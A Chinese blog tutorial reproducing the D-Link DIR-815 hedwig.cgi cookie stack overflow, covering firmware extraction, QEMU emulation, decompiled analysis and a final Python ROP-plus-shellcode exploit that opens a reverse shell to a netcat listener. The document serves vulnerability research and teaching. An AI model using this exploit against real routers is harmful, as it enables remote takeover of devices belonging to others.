---
title: "DIR-815 栈溢出漏洞复现"
description: "D-Link DIR-815 的 hedwig.cgi 栈溢出：固件分离、QEMU 仿真、定位漏洞，再到 ROP + shellcode 拿 shell。"
pubDate: 2026-05-21
category: iot
tags: [iot]
---

## 固件分离
复现用[这个固件](https://rebyte.me/en/d-link/89510/file-592084/)。拿到之后先 `binwalk` 看看里面有什么：
```bash
➜  dir815_FW_101 binwalk ./DIR-815_FW_1.01b14.bin
---------------------------------------------------------------------------
DECIMAL         HEXADECIMAL     DESCRIPTION
---------------------------------------------------------------------------
0               0x0             DLOB firmware header,
								header size: 108 bytes,
								data size: 3792928

108             0x6C            LZMA compressed data,
								properties: 0x5D,
								dictionary size: 33554432 bytes,
								compressed size: 979100 bytes,
								uncompressed size: 3017436 bytes

983180          0xF008C         SquashFS file system, little endian,
								version: 4.0, compression: lzma,
                                inode count: 1526, block size: 262144,
                                image size: 2808054 bytes,
                                created: 2011-05-12 14:14:40
---------------------------------------------------------------------------
Analyzed 1 file for 85 file signatures (187 magic patterns) in 131.0 milliseconds
```
看到三个部分：
- D-Link 固件头部
- LZMA 压缩数据块
- 根文件系统 rootfs

提取前先装 `sasquatch`（binwalk 自带的不支持 squashfs 4.0 + lzma），然后：
```bash
sudo binwalk -e ./DIR-815_FW_1.01b14.bin
# 或者用 dd 命令
dd if=DIR-815_FW_1.01b14.bin of=squashfs.sqsh bs=1 skip=$((0xF008C)) status=progress
sudo sasquatch ./squashfs.sqsh
```
用 `sudo` 是因为文件系统里有 `/dev` 这类设备节点，不 root 建不出来。

## 仿真运行
### 下载内核文件
点击[下载地址](https://people.debian.org/~aurel32/qemu/mipsel/)

`vmlinux-3.2.0-4-4kc-malta` 和 `vmlinux-2.6.32-5-4kc-malta` 都能用：固件里原本是 2.6 的内核，我用的是 3.2。

### 构建文件系统
上一步拿到的是 SquashFS 镜像，这个内核不认，得转成 ext2 再挂进 QEMU。

64M 够用，不够再改大。
```bash
mkdir mnt
dd if=/dev/zero of=rootfs.ext2 bs=1M count=64

sudo mount -o loop rootfs.ext2 mnt
```

然后在 mnt/ 目录下，创建 init 文件，内容如下
```sh
#!/bin/sh

echo "[+] custom /init started"

mount -t proc proc /proc
mount -t sysfs sysfs /sys
mkdir -p /dev/pts 2>/dev/null
mount -t devpts devpts /dev/pts 2>/dev/null

echo "[+] setup /var"
mkdir -p /var 2>/dev/null
mount -t ramfs ramfs /var 2>/dev/null
mkdir -p /var/tmp /var/run /var/etc /var/log
chmod 777 /var/tmp

echo "[+] configure eth0"
ifconfig eth0 10.0.2.15 netmask 255.255.255.0 up
route add default gw 10.0.2.2 2>/dev/null

echo "[+] network status"
ifconfig eth0
route -n

if [ -f /htdocs/httpd.conf ]; then
    echo "Starting HTTPD..."
    /sbin/httpd -n -f /htdocs/httpd.conf &
else
    echo "Error: httpd.conf missing!"
fi

echo "[+] starting shell"
exec /bin/sh
```

在 mnt/htdocs/ 目录下，创建 httpd.conf ，内容如下
```
Umask 026
PIDFile /var/run/httpd.pid

Tuning
{
    NumConnections 15
    InputBufSize 16384
    BufSize 32768
    ScriptBufSize 4096
    NumHeaders 100
    Timeout 60
    ScriptTimeout 60
}

Control
{
    Types
    {
        text/html       { html htm }
        text/xml        { xml }
        text/plain      { txt }
        image/gif       { gif }
        image/jpeg      { jpg }
        text/css        { css }
        application/javascript { js }
        application/octet-stream { * }
    }

    Specials
    {
        Dump            { /dump }
        CGI             { cgi }
        Imagemap        { map }
        Redirect        { url }
    }

    External
    {
        /usr/sbin/phpcgi { php }
    }
}

Server
{
    ServerName "Linux, HTTP/1.1, QEMU Ver test"
    ServerId "LAN-1"
    Family inet
    Interface eth0
    Address 0.0.0.0
    Port 80

    Virtual
    {
        AnyHost

        Control
        {
            Alias /
            Location /htdocs/web
            IndexNames { index.php index.html }

            External
            {
                /usr/sbin/phpcgi { php }
                /usr/sbin/phpcgi { router_info.xml }
                /usr/sbin/phpcgi { post_login.xml }
            }

            Specials
            {
                CGI { cgi }
            }
        }

        Control
        {
            Alias /HNAP1
            Location /htdocs/HNAP1

            External
            {
                /usr/sbin/hnap { hnap }
            }

            IndexNames { index.hnap }
        }
    }
}
```

然后使用 `sudo chmod 750 init` 修改 init 的权限为 750 。

传入一个 静态编译的 gdbserver 到 mnt 目录下。
下载链接：[Releases · guyush1/gdb-static](https://github.com/guyush1/gdb-static/releases)

最后，解除挂载： `sudo umount mnt` 。

### 运行
创建 run.sh，内容如下
```sh
#!/bin/sh
qemu-system-mipsel \
  -M malta \
  -kernel vmlinux \
  -drive file=rootfs.ext2,format=raw,if=ide \
  -append "root=/dev/sda rw rootfstype=ext2 console=ttyS0 init=/init" \
  -netdev user,id=n0,hostfwd=tcp::6666-:80,hostfwd=tcp::1234-:1234 \
  -device pcnet,netdev=n0 \
  -nographic
```

容器里的 80 和 1234 分别转发到宿主的 6666 和 1234：前者访问 web，后者留给 gdbserver。可以先访问 `http://127.0.0.1:6666/hedwig.cgi` 看看有没有响应。

## 漏洞程序分析
`/htdocs/web/hedwig.cgi` 是个指向 `/htdocs/cgibin` 的软链接。

### hedwigcgi_main
使用 ida 打开
```C
if ( !strcmp(v3, "hedwig.cgi") )
{
    v8 = &hedwigcgi_main;
    v9 = argc;
    return v8(v9, argv, envp);
}
```

看 `hedwigcgi_main`：
```C
...
char v27[1024]; // [sp+C0h] [-400h] BYREF
...
v20 = sobj_get_string(v4);
sprintf(v27, "/htdocs/webinc/fatlady.php\nprefix=%s/%s", "/runtime/session", v20);
xmldbc_ephp(0, 0, v27, stdout);
...
```
`%s` 没有限定长度，而 `v27` 只有 1024 字节——`v20` 够长就能溢出。接下来往上追 `v20` 从哪来：

```C
char *__fastcall sobj_get_string(int a1)
{
  int v1; // $v1

  v1 = 0;
  if ( a1 )
  {
    v1 = *(a1 + 20);
    if ( !v1 )
      return "";
  }
  return v1;
}
```
`v20` 其实是 `v4` 指向的结构体里的一个字段，继续追 `v4`：

```C
v4 = sobj_new();
v5 = sobj_new();
v3 = v5;
if ( !v4 || !v5 )
{
res = "unable to allocate string object";
goto LABEL_34;
}
sess_get_uid(v4);
```
v4 的内容在 sess_get_uid 中被修改。

### sess_get_uid
简单修改后，内容大致如下
```C
void __fastcall sess_get_uid(sobj *ptr)
{
  sobj *key_obj;          // $s2
  char *HTTP_COOKIE;      // $v0
  sobj *val_obj;          // $s3
  char *HTTP_COOKIE_ptr;  // $s4
  int flag;               // $s1
  int val;                // $s0
  char *string;           // $v0

  key_obj = sobj_new();
  val_obj = sobj_new();
  HTTP_COOKIE = getenv("HTTP_COOKIE");
  if ( !key_obj )
    goto LABEL_27;
  if ( !val_obj )
    goto LABEL_27;
  HTTP_COOKIE_ptr = HTTP_COOKIE;
  if ( !HTTP_COOKIE )
    goto LABEL_27;
  flag = 0;
  while ( 1 )
  {
    val = *HTTP_COOKIE_ptr;
    if ( !*HTTP_COOKIE_ptr )
      break;
    if ( flag == 1 )
      goto LABEL_11;
    if ( flag < 2 )
    {
      if ( val == ' ' )
        goto LABEL_18;
      sobj_free(key_obj);
      sobj_free(val_obj);
LABEL_11:
      if ( val == ';' )
      {
        flag = 0;
      }
      else
      {
        flag = 2;
        if ( val != '=' )
        {
          sobj_add_char(key_obj, val);
          flag = 1;
        }
      }
      goto LABEL_18;
    }
    if ( flag == 2 )
    {
      if ( val == ';' )
      {
        flag = 3;
        goto LABEL_18;
      }
      sobj_add_char(val_obj, *HTTP_COOKIE_ptr++);
    }
    else
    {
      flag = 0;
      if ( !sobj_strcmp(key_obj, "uid") )
        goto end;
LABEL_18:
      ++HTTP_COOKIE_ptr;
    }
  }
  if ( !sobj_strcmp(key_obj, "uid") )
  {
end:
    string = sobj_get_string(val_obj);
    goto LABEL_22;
  }
LABEL_27:
  string = getenv("REMOTE_ADDR");
LABEL_22:
  sobj_add_string(ptr, string);
  if ( key_obj )
    sobj_del(key_obj);
  if ( val_obj )
    sobj_del(val_obj);
}
```
一句话：从 `HTTP_COOKIE` 里挑出 `uid=` 后面的值，写进 `ptr`（也就是上文的 `v4`）。

于是溢出点就落在 `HTTP_COOKIE` 上。

## 漏洞复现

### 调试方案
使用 run.sh 启动服务后，使用 ps 查看 httpd 进程的 pid，然后使用 gdbserver 附加
```bash
/gdbserver 0.0.0.0:1234 --attach <pid>
```

然后在宿主机上使用 `gdb-multiarch ./hedwig.cgi` 调试，然后用 `target remote :1234` 连接远程。

### 漏洞利用
确认是 MIPS 栈溢出之后，还得先解决两个"跑不到 `sprintf`"的问题：
```C
v20 = sobj_get_string(v4);
sprintf(v27, "/htdocs/webinc/fatlady.php\nprefix=%s/%s", "/runtime/session", v20);
xmldbc_ephp(0, 0, v27, stdout);
```

### 必须是 POST
```C
...
    REQUEST_METHOD = getenv("REQUEST_METHOD");
    if ( !REQUEST_METHOD ) {
        v1 = "no REQUEST";
LABEL_7:
        obj_2 = 0;
        obj1 = 0;
LABEL_34:
        v9 = -1;
    goto LABEL_25;
    }
    if ( strcasecmp(REQUEST_METHOD, "POST") ) {
    v1 = "unsupported HTTP request";
    goto LABEL_7;
    }
...
LABEL_25:
        printf("HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\n\r\n<hedwig><result>FAILED</result><message>%s</message></hedwig>",
        v1);
    }
LABEL_26:
    if ( haystack )
        free(haystack);
    if ( obj_2 )
        sobj_del(obj_2);
    if ( obj1 )
        sobj_del(obj1);
    return v9;
}
```
所以请求必须是 POST。

### 需要 XML 数据
另外 `haystack` 不能为空：
```C
if ( !haystack )
{
    v1 = "no xml data.";
    goto LABEL_34;
}
```

这个变量可以通过 **cgibin_parse_request -> sub_403B10 -> sub_402FFC -> sub_402B40 -> sub_409A6C** 的路径赋值（实际上是 `hedwigcgi_main` 中，`cgibin_parse_request` 将 `sub_409A6C` 函数指针作为参数传递，最后在 `sub_402B40` 触发 `sub_409A6C`）

`cgibin_parse_request` 的关键部分如下（省略无关分支）：
```C
int __fastcall cgibin_parse_request(void (*func)(), int num, unsigned int a3)
{
...

    if ( getenv("CONTENT_TYPE") && (CONTENT_LENGTH_STR = getenv("CONTENT_LENGTH")) != 0 )
        CONTENT_LENGTH = atoi(CONTENT_LENGTH_STR);
    else
        CONTENT_LENGTH = 0;
    v20.k_obj = sobj_new();
    v8 = sobj_new();
    v20.v_obj = v8;
    v9 = -1;
    if ( v20.k_obj && v8 ) {
        v10 = getenv("REQUEST_URI");
    if ( v10 )
    {
      v11 = strchr(v10, 63);
      v9 = 0;
      if ( v11 )
      {
        ...
        v9 = 0;
      }
    }
    else
    {
      v9 = -1;
    }
  }
...
  if ( v9 != -1 )
  {
    if ( a3 >= CONTENT_LENGTH )
    {
      if ( CONTENT_LENGTH )
      {
        getenv("CONTENT_TYPE");
        CONTENT_TYPE = getenv("CONTENT_TYPE");
        if ( CONTENT_TYPE )
        {
          func_stru = funcs;
          idx = 0;
          while ( 1 )
          {
            path = func_stru->path;
            if ( !func_stru->path )
              break;
            len = func_stru->len;
            ++func_stru;
            ++idx;
            if ( !strncasecmp(CONTENT_TYPE, path, len) )
              return (funcs[idx - 1].fun)(func, num, CONTENT_LENGTH, &CONTENT_TYPE[len]);
          }
        }
        return -1;
      }
    }
    else
    {
      sub_402CE8(CONTENT_LENGTH);
      return -100;
    }
  }
  return v9;
}
```
函数指针在 `(funcs[idx - 1].fun)(func, num, CONTENT_LENGTH, &CONTENT_TYPE[len])` 处被调用，对应的 path 前缀是 `application/`。

```C
int __fastcall sub_403B10(void (*func)(), int num, size_t len, const char *str) {
    if ( !strncasecmp(str, "x-www-form-urlencoded", 0x15u) )
        return sub_402FFC(func, num, len);
    sub_402CE8(len);
    sub_403794("read_ct_application", str);
    return -1;
}
```
要走 `sub_402FFC`，`&CONTENT_TYPE[len]` 必须等于 `x-www-form-urlencoded`，合起来就是请求头 `Content-Type: application/x-www-form-urlencoded`。

#### 尝试调试
先连上调试、下好断点，`continue` 之后用脚本发请求：
```python
import requests
from pwn import *

url = "http://127.0.0.1:6666/hedwig.cgi"
solid = "/htdocs/webinc/fatlady.php\nprefix=/runtime/session/"
slen = len(solid)

payload = (1024+9*4 - slen)*b"A"
payload += b'\x66'

data = {"atker": "fun"}
header = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": b"uid=" + payload
}
res = requests.post(url = url, data = data, headers = header)
```
就能看到程序停在断点处。

> 注意：payload 里不要出现 `\x00`，会被截断；`\x09` 也会被当成空格处理成 `\x20`。

### 反弹 shell
上面那个脚本刚好把返回地址的最低字节写成 `0x66`，换成别的值就能跳到任意地址。

MIPS 的 ROP 细节这里不展开，本质还是找 gadget 拼链。

这里采用 ROP+shellcode 反弹 shell 的方法，记得另开一个终端监听 4444 端口：`nc -lvnp 4444`
```python
import requests
from pwn import *

context.arch = "mips"
context.endian = "little"
context.os = "linux"

url = "http://127.0.0.1:6666/hedwig.cgi"
solid = "/htdocs/webinc/fatlady.php\nprefix=/runtime/session/"
slen = len(solid)

libc = 0x77f34000

# move $t9, $a1 ; addiu $a0, $a0, 0x4c ; jr $t9 ; move $a1, $a2
gad1 = 0x37E6C + libc
# addiu $a1, $sp, 0x18 ; move $t9, $s4 ; jalr $t9 ; move $s5, $v0
gad2 = 0x3B974 + libc

binsh = 0x5A448 + libc
printf = 0x2D890 + libc
system = 0x53200 + libc

print("gad1: " + hex(gad1))
print("gad2: " + hex(gad2))
print("binsh: " + hex(binsh))
print("printf: " + hex(printf))

ip = "10.0.2.2"
port = 4444

sc  = shellcraft.mips.linux.connect(ip, port)
sc += shellcraft.mips.linux.dup2("$s0", 0)
sc += shellcraft.mips.linux.dup2("$s0", 1)
sc += shellcraft.mips.linux.dup2("$s0", 2)

sc += f"""
    li $a0, {binsh}
    addiu $sp, $sp, -8
    sw $a0, 0x360($sp)
    xor $s2, $s2, $s2
    sw $s2, 0x364($sp)
    addiu $a1, $sp, 0x360
    slti $a2, $zero, 0xFFFF
    li $v0, 0xfab
    syscall 0x40404
"""

shellcode = asm(sc)

# print("shellcode length: " + str(len(shellcode)))
# print(b"shellcode: " + shellcode)

payload = (1024 - slen)*b"A"
payload += 4*b"B"
payload += 4*b"C"
payload += 4*b"D"
payload += 4*b"E"
payload += p32(gad1)
payload += 4*b"G"
payload += 4*b"H"
payload += 4*b"I"
payload += 4*b"J"
payload += p32(gad2)
payload += 4*b"L"
payload += 4*b"M"
payload += 4*b"N"
payload += 4*b"O"
payload += 4*b"P"
payload += 4*b"Q"
payload += shellcode

data = {"atker": "fun"}
header = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": b"uid=" + payload
}
res = requests.post(url = url, data = data, headers = header)
print(res.text)
```

## 参考文献

- [IoT 安全从零到掌握：超详尽入门指南（实战篇）-先知社区](https://xz.aliyun.com/news/15948)
- [[原创] 从零开始复现 DIR-815 栈溢出漏洞-二进制漏洞-看雪安全社区｜专业技术交流与安全研究论坛](https://bbs.kanxue.com/thread-272318.htm)
